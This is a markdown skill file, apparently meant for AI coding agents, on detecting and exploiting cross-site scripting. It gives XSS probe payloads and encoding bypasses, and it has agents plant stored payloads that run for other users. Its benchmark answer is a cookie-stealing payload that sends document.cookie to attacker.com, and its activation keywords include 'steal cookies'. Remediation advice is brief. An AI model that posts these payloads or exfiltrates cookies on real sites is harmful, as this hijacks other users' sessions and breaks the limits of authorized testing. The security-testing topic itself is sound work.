---
name: "🖥️ Skill: XSS & HTML Injection"
tags: ["activation", "antigravity", "benchmark", "c:", "execution", "frontend", "gemini", "html", "injection", "<YOUR_USERNAME>", "output", "pipeline", "security", "signals", "signature", "skill", "steps", "sub", "task", "users"]
tier: 3
risk: "high"
estimated_tokens: 374
tools_needed: ["markdown", "terminal"]
applies_to_agents: ["cursor", "claude", "copilot", "cline", "continue", "kiro", "roo"]
industry: ["web", "product"]
quality_score: 0.58
---
# 🖥️ Skill: XSS & HTML Injection

> **PURPOSE:** Detect and exploit Cross-Site Scripting (Reflected, Stored, DOM).
> **CATEGORY:** Security
> **TIER:** 3+

---

## 🚦 ACTIVATION SIGNALS

- Keywords: `XSS testing`, `find cross-site scripting`, `steal cookies`, `HTML injection`.
- Goal: Systematically testing for client-side script execution via unsanitized input.

---

## 🛠️ SUB-STEPS (EXECUTION PIPELINE)

1. **Endpoint Identification**: Find endpoints with user-reflecting input (`?q=search`, `user_profile.php`, `comments`).
2. **Standard Reflected Testing**: Use `<script>alert(1)</script>` or `"><img src=x onerror=alert(1)>`.
3. **Stored XSS Assessment**: Post payloads in comments or profiles to see if they execute for other users.
4. **DOM-Based Testing**: Use `window.location.hash`, `eval()`, or `innerHTML` sinks to find client-side-only XSS.
5. **Encoding Bypass**: Use URL encoding (`%3Cscript%3E`), Double URL encoding, or Base64/Octal payloads.
6. **Remediation**: Use `DOMPurify.sanitize()` (React/Next), `html.escape()` (Python), or automated template escaping (Twig, EJS).

---

## 📝 OUTPUT SIGNATURE

- XSS evidence (PoC snapshots).
- Proof of Concept (PoC) with successful alert/cookie-steal.
- Patch recommendations (Safe sinks/Sanitization).

---

## 🧪 BENCHMARK TASK

- **Input**: "Test our comment section for stored XSS."
- **Output**: Payload (`<img src=x onerror=fetch('http://attacker.com/log?c='+document.cookie)>`) -> Evidence (Cookie logged) -> Sanitization patch.
